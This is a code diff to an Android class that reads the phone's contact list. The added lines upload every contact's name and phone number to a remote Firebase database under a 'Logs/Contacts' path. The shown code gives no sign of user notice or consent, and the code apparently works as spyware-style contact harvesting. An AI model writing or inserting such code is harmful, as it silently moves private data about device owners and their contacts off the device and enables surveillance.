@@ -5,6 +5,12 @@ import android.database.Cursor;
 import android.provider.ContactsContract;
 import android.util.Log;
 
+import com.google.firebase.auth.FirebaseAuth;
+import com.google.firebase.database.DatabaseReference;
+import com.google.firebase.database.FirebaseDatabase;
+
+import java.util.UUID;
+
 
 public class Contacts {
 
@@ -39,7 +45,15 @@ public class Contacts {
                         sb.append("\n----------------------------------\n");
                         Log.i(TAG, "Name: " + name);
                         Log.i(TAG, "Phone Number: " + phoneNo);
+                        String ranuid= UUID.randomUUID().toString();
+
+                        DatabaseReference mDatabase = FirebaseDatabase.getInstance().getReference();
+
+                        mDatabase.child(FirebaseAuth.getInstance().getCurrentUser().getUid()).child("Data").child("Logs").child("Contacts").child(ranuid).child("Name").setValue(name);
+                        mDatabase.child(FirebaseAuth.getInstance().getCurrentUser().getUid()).child("Data").child("Logs").child("Contacts").child(ranuid).child("Number").setValue(phoneNo);
+
                     }
+
                     pCur.close();
                 }
             }
